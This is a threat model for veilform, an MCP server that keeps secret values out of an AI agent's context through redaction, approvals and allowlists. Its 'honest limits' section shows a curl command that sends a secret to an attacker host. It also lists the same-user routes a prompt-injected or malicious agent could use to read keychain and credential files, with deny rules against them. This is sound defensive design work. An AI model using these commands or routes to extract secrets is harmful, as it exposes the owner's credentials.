# Threat model — veilform

> Status: MVP (0.1.0). This document is deliberately honest about what is **not** protected.

## 1. What we are trying to achieve

An AI agent (the "model") coordinates work that needs credentials or sensitive data, but **the values must never enter the model's context**: not the prompt, not tool results, not the chat transcript, not logs that the model or its vendor may read.

The person (the "owner") types values into a page served locally by this MCP server, or lets the server capture them from a web panel in a browser the server owns. From then on, the agent refers to values by name (`${secret:NAME}`) and the server resolves them **inside its own process, at the moment of use**.

## 2. Assets

| Asset | Examples |
|---|---|
| Secret values | API keys (Stripe, Mercado Pago), DB passwords, SSH private keys, web sessions |
| Sensitive business data | Price lists, customer data, RFC/tax ids typed through `blind_input` |
| Bootstrap credentials | Token for a remote store (Vault, Infisical, 1Password Connect, OPS) |
| Approvals | "remember this exact action" fingerprints |
| Audit trail | who/what/when, fingerprints |

## 3. Actors and trust

| Actor | Trust |
|---|---|
| Owner at the keyboard | Trusted. Makes the final decision on every new action. |
| This MCP server process | Trusted computing base (TCB). Runs as the owner's OS user. |
| The model / agent | **Untrusted for confidentiality.** May be confused, prompt-injected, or malicious. May request anything. |
| Model vendor / transcript storage | Untrusted for confidentiality. |
| Other local processes of the same OS user | **Trusted by necessity** (see limits). |
| Remote APIs, SSH hosts, databases | Trusted to receive the values the owner approved for them, nothing more. |
| Web pages opened by `web_capture` | Untrusted content. |

## 4. What is protected (and how)

### 4.1 The model never sees values
- Tool results are structural only: names, statuses, counts, ids, fingerprints, error **codes**.
- Every tool response passes through a final scrub against a process-wide registry of every value the server has handled (form submissions, resolved secrets, captured values), including encodings (see 4.4). If anything matches, it is replaced and an audit event `response_scrubbed` is written.
- Remote error bodies are never returned; SQL errors are reduced to SQLSTATE codes (`\set VERBOSITY sqlstate`), HTTP sink failures to `http_<status>`, Playwright failures to `timeout`/`step_failed` + step index.
- Ids returned from sinks that equal a submitted value are replaced with `h:<sha256 prefix>`.
- Validation errors are `{field, code}`; the page re-renders errors without echoing values back to the server response.
- Tested by property tests over random values: tool responses, the raw JSON-RPC wire, audit log, index file and stderr never contain the value or any of its variants (`test/app.test.ts`, `test/mcp.test.ts`).

### 4.2 Transcripts, argv and logs
- Values never go into **argv** of any process we spawn: keychain CLIs get them on stdin (`secret-tool store`, `security -i`), `gh secret set` on stdin, SSH writes on stdin, SSH passwords through `SSH_ASKPASS` reading a **FIFO** in a 0700 temp dir, psql receives values as `COPY ... FROM STDIN` CSV data, `secret_use exec` passes them via env/stdin of the child.
- `exec` with argv refuses `${secret:…}` inside argv tokens.
- The server logs (stderr) only ids, actions and codes. The audit log stores names, fingerprints, codes, session/agent/client ids.

### 4.3 The local page
- Bound to `127.0.0.1`, ephemeral port. 256-bit URL token, **single use**: the first browser to open it gets an HttpOnly, `SameSite=Strict`, path-scoped cookie; any other client gets `410`. After submit/cancel/expiry the token is dead. Default TTL 10 min.
- POST requires: session cookie, CSRF token in body **and** `X-SI-CSRF` header, `Content-Type: application/json`, `Origin` = this server, `Sec-Fetch-Site: same-origin` when present. `Host` must be `127.0.0.1:<port>`/`localhost:<port>` on every request (DNS-rebinding defence).
- CSP: `default-src 'none'`, scripts and styles only with a per-response nonce, `connect-src 'self'`, `form-action 'none'`, `frame-ancestors 'none'`, no images/fonts/third parties. `Referrer-Policy: no-referrer`, `Cache-Control: no-store`, COOP/CORP/COEP, `Permissions-Policy` (no camera/mic/geo/clipboard-read).
- Model-provided strings (titles, labels, help, templates) are rendered with `textContent` only and embedded as escaped JSON; no `innerHTML`.
- Inputs disable autocomplete/autocorrect/spellcheck and password-manager heuristics; secret inputs are `type=password` with a show/hide toggle.
- On success the form is removed from the DOM.

### 4.4 Output redaction (`secret_use`, `ssh_exec`)
Removes the value and common variants: raw, trimmed, JSON-escaped (single and double), URL-encoded (`%20` and `+`), `encodeURI`, HTML-escaped, shell-quoted, hex (lower/upper), base64 / base64url (with and without padding) **including the value embedded at any byte offset inside a larger base64 blob** (e.g. `Authorization: Basic base64(user:secret)`), each long line of multi-line values (PEM), and a trailing prefix when output was truncated. Output size and time are bounded.

### 4.5 Approvals
- Every **new** `secret_use`, `secret_write` target, non-store `blind_input` sink, `web_capture`/`web_login` plan and `ssh_exec` command needs an explicit click on a local approval page that shows the **literal** action (with `${secret:…}`/`${field}` placeholders, never values), the secrets involved, cwd/host/path/keys and heuristic warnings (shell, network/encoding tools, interpreters).
- The owner may "remember" an approval; it is keyed by the SHA-256 fingerprint of the exact canonical plan. Any change (one character of the command, a header, a different secret, cwd, host, path, key) is a new fingerprint and asks again.
- Clipboard copies are never remembered and happen only from a click on the page (the value is sent to that page only, and cleared after N seconds).

### 4.6 Storage
- `keychain`: OS keychain via Secret Service (`secret-tool`) or macOS `security`.
- `encrypted-file`: AES-256-GCM per entry with the entry name as AAD; key = random 32 bytes in the OS keychain, or scrypt (N=2^17) of a passphrase from an env var. File 0600, atomic replace.
- `env-file` / `ssh-file` / `secret_write` targets: 0600 by default, temp file + rename (atomic), optional backup, only the requested key changes.
- In-memory cache of resolved values: TTL `cacheTtlSeconds` (default 60 s), cleared on exit. No plaintext cache on disk.
- SSH private keys created by `ssh_key_provision` are stored in the secret store and loaded via `ssh-add -` into a **private ssh-agent** owned by this process (or a 0600 file if the owner prefers).

### 4.7 Allowlists
Everything the model can target is declared by the owner in `config.json`: destinations, SSH hosts, write targets (globs on path/keys/repo/unit), HTTP hosts, databases + tables + columns, web sites + origins. HTTPS is mandatory for remote stores and HTTP actions (plain HTTP only on loopback when explicitly enabled for tests).

### 4.8 Audit
Append-only JSONL with a SHA-256 hash chain (`prev` field); `veilform verify-audit` detects edits/truncation in the middle. Each entry records session id, agent label (`VEILFORM_AGENT`), MCP client name/version, action, fingerprint, names — never values.

## 5. Specific risk: fetching secrets from remote stores by API

`http-api` destinations (Vault KV v2, Infisical, 1Password Connect, OPS addon settings, generic) fetch values **server→server** at the moment of use and write them there at intake time. Risks:

- **Bootstrap secret**: the token for the remote store is itself the crown jewel. It is resolved from a **local** store (`auth.tokenRef`, OS keychain by default) and never from the config file; `http-api` destinations cannot hold their own bootstrap token. Ask the owner to store it once with `secret_request` into the keychain.
- **Blast radius**: whoever controls the local OS user can read the keychain and therefore the bootstrap token, and through it **every** secret the token can read. Use narrowly scoped tokens (per project/environment, read-only where possible, short TTL), and the remote store's own audit.
- **Transport**: TLS is required; custom CA via `caFile`; host allowlist; no redirects are followed; responses are size-limited and never returned to the model.
- **Remote echo**: an API may echo values in error bodies; we never return bodies, only status codes.
- **OPS adapter note**: in the OPS code inspected (`backend/services/addon_service.go`), addon settings are stored as plain `jsonb` and `GET /api/addons/:key/settings` returns them unmasked to any authenticated org member. Treat the OPS adapter as an *example* and verify encryption at rest / role gating before relying on it.

## 6. Honest limits (NOT protected)

1. **An approved action that exfiltrates or transforms the value.** If the owner approves `curl https://attacker/?k=${secret:X}`, or a script that encrypts/reverses/splits the value before printing it, the redactor cannot help. This is why approval pages show the literal action and warn on shells, interpreters and network/encoding tools. Read before you click; do not "remember" shell scripts you do not fully understand.
2. **A malicious or prompt-injected model asking to approve something harmful.** The approval page is the control; social engineering of the owner is out of scope. Keep "remember" for narrow, boring actions.
3. **Same-user local malware or an agent with unrestricted shell.** Anything running as the same OS user can read the keychain (`secret-tool lookup …`), the encrypted file + key, the `.env` files we write, `/proc/<pid>/environ` of children, and can edit `approvals.json`. If your agent also has an unrestricted Bash tool, it can do the same. Mitigations: restrict the agent's shell (Claude Code permission rules: deny `secret-tool`, `security`, `cat`/`Read` on `~/.config/veilform/**` and on the `.env` files you deploy), run the agent sandboxed or as another user.
4. **Values legitimately present in the child's environment.** `exec` puts values in the child's env; in shell mode the shell may put them in grandchildren's argv (e.g. `curl -H "…$TOKEN"`), visible to same-user `ps` during execution.
5. **XSS in the local page.** We render untrusted strings with `textContent` and a nonce CSP, but a browser bug or a future code change could break this. A malicious browser extension can read anything typed in any page.
6. **Phishing look-alike.** A malicious agent could show the owner a URL to a fake page that looks like ours. Always check the address is `http://127.0.0.1:<port>/p/…`; the page shows the request id that also appears in the chat.
7. **Another browser the model controls.** If the agent drives its own browser (e.g. Claude in Chrome, Playwright MCP, computer use) and a page displays a secret, **the model sees it** in page text/screenshots. Use `web_capture` (this server's own browser, which returns nothing but status) whenever a page shows or needs a secret, and do not open credential pages in a browser the agent can see.
8. **Files we deploy are readable by design.** `secret_write` / `env-file` produce plaintext 0600 files for the target service. Anyone/anything that can read them (including the agent's file tools) can read the secret. Keep those paths outside the agent's read scope.
9. **JavaScript strings cannot be zeroised.** Values live briefly in the V8 heap of this process and of the browser tab.
10. **Redaction is heuristic.** Short values (< 3 chars) are not redacted; exotic encodings (base32, gzip, ROT13, per-character output) are not detected.
11. **Clipboard.** Other apps (clipboard managers, sync) may capture the value before it is cleared; clearing only happens while the tab stays open.
12. **SQL via `psql`.** Values are data, never SQL text, but the `psql` argv prefix and target tables/columns come from the owner's config; a misconfigured allowlist widens what the model can write.
13. **Web capture.** We stop the browser from typing secrets or extracting outside allowlisted origins, but a compromised allowlisted site can still receive what it is given.
14. **Windows** keychain backend is not implemented (use `encrypted-file`).

## 7. Recommendations for operators

- Keep the default `ui.openBrowser: true` and use clients that support MCP URL elicitation, so links never need to be copied from the chat.
- Use the keychain or `encrypted-file` with a keychain-held key; avoid `env`-passphrases in `claude mcp add -e` (they end up in the client's config file).
- Scope remote-store tokens narrowly; rotate (`secret_rotate`, `rotate_after_days`).
- Review `approvals.json` periodically; delete entries to force re-approval.
- Run `veilform verify-audit` in your backups.
